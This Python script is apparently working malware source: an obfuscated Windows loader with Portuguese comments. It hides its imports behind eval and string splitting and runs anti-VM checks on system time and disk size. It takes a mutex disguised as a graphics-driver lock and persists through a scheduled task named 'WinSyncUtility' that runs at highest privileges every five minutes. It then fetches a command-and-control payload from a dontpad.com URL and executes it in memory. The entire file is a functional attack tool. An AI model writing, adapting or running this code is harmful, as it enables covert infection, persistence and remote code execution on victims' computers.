PT = "a"
W = ["api", "com", "dontpad", PT, "utf-8", "ex", "it", "am", "i", "who", "htasd", "//", "http:", "sub", "4", "__", "net", "."]
s = f'{W[15]}im' + f'port{W[15][::-1]}'
e = eval
sti = e(s)('sh'+'ut'+W[8]+'l')
TME = e(s)("t"+"ime")
CT = e(s)('cty'+'pes')
RQ = e(s)('re'[::-1][::-1]+'que'[::-1][::-1]+'sts'[::-1]) 
oss = 'ocess'
gr = 'grap'
gss = e(s)('g'+'et'+'pas'+oss[-1])
frn = e(s)('cr'+'ypto'+gr+'hy'+W[-1]+'fern'+'et', fromlist=['Fer'+W[16]]).Fernet
MP = b"DASMKDHJASD&@)#(*!@#@()#12-0988-183-210u_UDHSAJDHKLGAISD&@-012378-0123)"
UP = e(s)('ur'+'llib'+W[-1]+'parse') 
IMPLIB = e(s)('im'+'port'+'lib') 

# mudar
M1 = f'Global\\DR{W[8]}VER_Grap{W[8]}cs_Lock_A2' 
MUTEX_NAME = M1.replace(W[8], 'I')
os_mod = e(s)('os')         # os
sbp = e(s)('sub'+'process') # subprocess
ntpath = e(s)('nt'+'pa'+'th') # ntpath
sys_mod = e(s)('sy'+'s')
b12 = e(s)('b'+'ase6'+f'{W[14]}')
hlib = e(s)('hashlib')

SESSION_TOKEN = "128007249672c60861c7"
PAYLOAD_URL = (
        f"https://api.dontpad.com/yaguinhofodinha.body.json?lastModified=0&session-token={SESSION_TOKEN}"
    )

def log(message):
    print(f"[{TME.time()}] STATUS: {message}")

def mfk(m):
   # Applies standard hashing for key generation to ensure uniqueness.
   sha_func = getattr(hlib, 'sha'+'256') 
   d = sha_func(m).digest()
   efn = 'urlsafe' + '_b'+'6'+ W[14] + 'encode' 
   ef = getattr(b12, efn)
   
   # Returns the URL-safe encoded final key.
   return ef(d)

def ext(p):
   k = mfk(MP)
   f = frn(k)
   t = f.encrypt(p.encode(W[4]))
   return t.decode(W[4])

# Decryption function for configuration data.
def dxt(t):
   k = mfk(MP)
   f = frn(k)
   return f.decrypt(t.encode(W[4])).decode(W[4])

def rm():
    status_check = 1
    if 1 in (1, 2, 3):
        status_check = 0
    gk = 'e'
    globals()['e'] = e(gk+''+''+''+'xe'+'c')
    f = globals()[gk]
    exit_command = f"raise SystemExit({status_check})"
    f(exit_command)

def cfz():
   if TME.time() < 1672531200:
     rm()
   func_name = 'di'+'sk' + W[15][-1] + 'us'+'a' + 'ge'
   dcf = getattr(sti, func_name)
   stt = dcf('.') 
   tg = stt.total / (1024 ** 3)
   
   if tg < 10*10:
     rm()

def is_already_running():
    global MUTEX_HANDLE
    
    try:
        mutex_handle = CT.windll.kernel32.CreateMutexW(None, 1, MUTEX_NAME)
        
        last_error = CT.windll.kernel32.GetLastError()
        
        if mutex_handle and last_error == 183:
            CT.windll.kernel32.CloseHandle(mutex_handle)
            return True
        
        elif mutex_handle:
            MUTEX_HANDLE = mutex_handle 
            return False

    except Exception as e:
        return False
    
    return False

def setup_persistence():
    TASK_NAME = "WinSyncUtility" 
    current_exe = getattr(sys_mod, 'executable') 
    
    user_name = gss.getuser()
    base_dir = f"C:\\Users\\{user_name}\\AppData\\Local\\{TASK_NAME}"
    
    dst_filename = getattr(ntpath, 'basename')(current_exe) 
    dst_path = f"{base_dir}\\{dst_filename}"
    
    try:
        getattr(os_mod, 'makedirs')(base_dir, exist_ok=True) 
        getattr(sti, 'copy')(current_exe, dst_path)
    except Exception:
        return 
    schtasks_cmd = (
        f'schtasks /create /tn "{TASK_NAME}" '
        f'/tr "{dst_path}" /sc MINUTE /mo 5 /F /rl HIGHEST'
    )
    try:
        result = getattr(sbp, 'run')(schtasks_cmd, shell=True, capture_output=True, text=True)

        if result.returncode != 0:
            log(f"ERRO SCHTASKS: {result.stderr}")
        else:
            log("SCHTASKS: Comando executado com sucesso.")
    except Exception:
        pass
    
if globals()['__name__'] == '__main__':
    log("EXECUÇÃO: Iniciando checagens de evasão...")

    # 1. Checagem Anti-VM (Se falhar, o script chama rm() e sai)
    cfz() 

    # 2. Checagem de Instância Única (Se Mutex existir, o script chama rm() e sai)
    if is_already_running():
        log("AVISO: Mutex detectado. Encerrando instância duplicada.")
        rm() 

    # 3. Criação da Persistência (Só executa se for a primeira instância)
    # Tenta instalar/agendar. O log de sucesso/erro está dentro da função.
    setup_persistence()

    log("STATUS: Checagens e persistência concluídas. Iniciando download...")

    # 4. Download e Execução em Memória do Payload C2
    try:
        res = getattr(RQ, 'get')(PAYLOAD_URL)
        if res.status_code == 200:
            payload_code = res.json()
            log("DOWNLOAD: Payload C2 obtido com sucesso. Executando em memória.")
            try:
                exec(payload_code['body'], globals())
            except Exception as pe:
                import traceback
                import io
                error_stream = io.StringIO()
                        
                # 2. Imprime o traceback completo, redirecionando para o nosso objeto
                traceback.print_exc(file=error_stream)
                
                # 3. Obtém o traceback como uma string
                traceback_str = error_stream.getvalue()
                
                # 4. Loga a mensagem de erro crítica e o traceback detalhado
                log(f"ERRO CRÍTICO no PAYLOAD C2 (Em Memória): {type(pe).__name__}: {pe}")
                log("---------------- TRACEBACK COMPLETO ----------------")
                print(traceback_str.strip()) # Imprime o traceback formatado
                log("---------------- FIM DO TRACEBACK ------------------")
                
                rm() 
        else:
            log(f"ERRO DE DOWNLOAD: Código {res.status_code}. Encerrando...")
            rm()
    except Exception as ex:
        print(f"ERRO DE REDE: Falha ao conectar à C2. {ex}. Encerrando...")
        rm()